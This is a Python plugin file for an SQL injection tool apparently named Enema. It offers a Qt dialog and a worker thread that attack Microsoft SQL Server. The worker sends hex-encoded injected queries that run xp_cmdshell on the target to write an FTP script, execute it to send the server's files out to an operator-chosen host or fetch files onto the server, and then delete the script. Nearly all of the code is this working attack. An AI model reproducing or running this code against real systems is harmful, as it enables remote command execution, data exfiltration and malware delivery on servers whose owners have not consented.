"""
    Enema plugin (mssql): Ftp file transfer
    Copyright (C) 2011 Valeriy Bogachuk
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import os
import time
import core.txtproc
from core.e_const import CONFIG_PATH
from core.http import HTTP_Handler
from PyQt6 import QtCore, QtWidgets

from .ui.Ui_ftp import Ui_ftpWidget


PLUGIN_NAME = "FTP"
PLUGIN_GROUP = "mssql"
PLUGIN_CLASS_NAME = "FtpWidget"
PLUGIN_DESCRIPTION = "FTP file transfer using SEND or GET command"


class FtpWidget(QtWidgets.QWidget):
    
    logSignal = QtCore.pyqtSignal(str)
     
    def __init__(self, vars, qstrings, parent=None):
        QtWidgets.QWidget.__init__(self, parent, QtCore.Qt.WindowType.Tool)
        self.ui = Ui_ftpWidget()
        self.ui.setupUi(self)
        self.setWindowModality(QtCore.Qt.WindowModality.ApplicationModal)
        self.vars = vars
        self.qstrings = qstrings
        self.ui.progressBar.hide()
        
        self.ui.ftpButton.clicked.connect(self.ftpButton_OnClick)
        
        #Load config
        if os.path.exists(CONFIG_PATH):
            settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.Format.IniFormat)
            self.ui.lineIP.setText(settings.value(PLUGIN_NAME + '/ip', ''))
            self.ui.lineFtpLogin.setText(settings.value(PLUGIN_NAME + '/login', ''))
            self.ui.lineFtpPwd.setText(settings.value(PLUGIN_NAME + '/password', ''))
            self.ui.lineFtpFile.setText(settings.value(PLUGIN_NAME + '/files', ''))
            self.ui.lineFtpPath.setText(settings.value(PLUGIN_NAME + '/path', ''))
            if settings.value("Main/window_position") is not None: 
                self.move(settings.value("Main/window_position"))
        #---

    def emitLog(self, logStr):
        self.logSignal.emit(logStr)
    
    #Hidding progressbar when task is done
    def taskDone(self):
        self.ui.progressBar.hide()

#Is program busy at this moment
    def isBusy(self):
        try:
            if self.worker.isRunning():
                return True
        except AttributeError:
            return False
            
    #FTP Upload button click        
    def ftpButton_OnClick(self):
        if self.isBusy():
            return
        #Adding variables from plugin widget
        ftpPath = self.ui.lineFtpPath.text()
        if len(ftpPath) > 0:
            if ftpPath[-1] != "\\":
                ftpPath += "\\"
        self.vars['login'] = self.ui.lineFtpLogin.text()
        self.vars['password'] = self.ui.lineFtpPwd.text()
        self.vars['ftpFiles'] = self.ui.lineFtpFile.text().split(";")
        self.vars['ftpPath'] = ftpPath
        self.vars['ip'] = self.ui.lineIP.text()
        if self.ui.radioGet.isChecked():
            self.vars['ftp_mode'] = 'get'
        else:
            self.vars['ftp_mode'] = 'send'
        #---
        self.ui.progressBar.show()
        self.worker = Worker(self.vars, self.qstrings)
        #Signal connects
        self.worker.logSignal.connect(self.emitLog, type=QtCore.Qt.ConnectionType.QueuedConnection)
        self.worker.taskDoneSignal.connect(self.taskDone, type=QtCore.Qt.ConnectionType.QueuedConnection)
        #---
        self.worker.start()
        
    #When widget closing
    def closeEvent(self, event):
        #Saving settings
        settings = QtCore.QSettings(CONFIG_PATH, QtCore.QSettings.Format.IniFormat)
        settings.setValue(PLUGIN_NAME + '/ip', self.ui.lineIP.text())
        settings.setValue(PLUGIN_NAME + '/login', self.ui.lineFtpLogin.text())
        settings.setValue(PLUGIN_NAME + '/password', self.ui.lineFtpPwd.text())
        settings.setValue(PLUGIN_NAME + '/files', self.ui.lineFtpFile.text())
        settings.setValue(PLUGIN_NAME + '/path', self.ui.lineFtpPath.text())
        settings.setValue(PLUGIN_NAME + '/get', self.ui.radioGet.isChecked())
        settings.setValue(PLUGIN_NAME + '/send', self.ui.radioSend.isChecked())
        settings.sync()

    
class Worker(QtCore.QThread):

    taskDoneSignal = QtCore.pyqtSignal()
    logSignal = QtCore.pyqtSignal(str)
        
    def __init__(self, vars, qstrings):
        QtCore.QThread.__init__(self)
        self.vars = vars
        self.qstrings = qstrings
        self.wq = HTTP_Handler()
        self.wq.logSignal.connect(self.log)
        
    def log(self, logStr):
        self.logSignal.emit(logStr)
            
    def run(self):
        self.logSignal.emit("+++ [" + PLUGIN_NAME + "]: TASK STARTED +++")
        #--------Task----------
        self.ftpTransferTask()
        #-----------------------
        time.sleep(0.1)
        self.taskDoneSignal.emit()
        self.logSignal.emit("*** [" + PLUGIN_NAME + "]: TASK DONE ***")
        
        
    def ftpTransferTask(self):
        #if defined non-standart ftp port
        ipaddr = self.vars['ip'].replace(":", " ")
        ftpFiles = self.vars['ftpFiles']
        tmp_file = self.vars['ftpPath'] + "xftp.txt"
        qString = self.qstrings.value('mssql_error_based/exec_hex')
        
        #del ..\temp\ftp.txt /Q
        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo open 127.0.0.1 21> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo open " + ipaddr + "> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo login>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['login'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #echo password>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo " + self.vars['password'] + ">> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        for file in ftpFiles:
            #Use SEND or GET ftp command?
            if self.vars['ftp_mode'] == "get":
                #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo get " + file + " " + self.vars['ftpPath']\
                + file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
            else:
                #echo send c:\path\file.exe>> ..\temp\ftp.txt
                hex = core.txtproc.strToHex("master..xp_cmdshell 'echo send " + self.vars['ftpPath'] +  file + ">> " + tmp_file + "'", True)
                query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
            self.wq.httpRequest(query, True, self.vars)
            
        #echo bye>> ..\temp\ftp.txt
        hex = core.txtproc.strToHex("master..xp_cmdshell 'echo bye>> " + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #ftp -s:..\temp\ftp.txt IP
        hex = core.txtproc.strToHex("master..xp_cmdshell 'ftp -s:" + tmp_file + "'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
        #del ..\temp\ftp.txt /Q
        hex = core.txtproc.strToHex("master..xp_cmdshell 'del " + tmp_file + " /Q'", True)
        query = self.wq.buildQuery(qString, self.vars, {'hex' : hex})
        self.wq.httpRequest(query, True, self.vars)
        
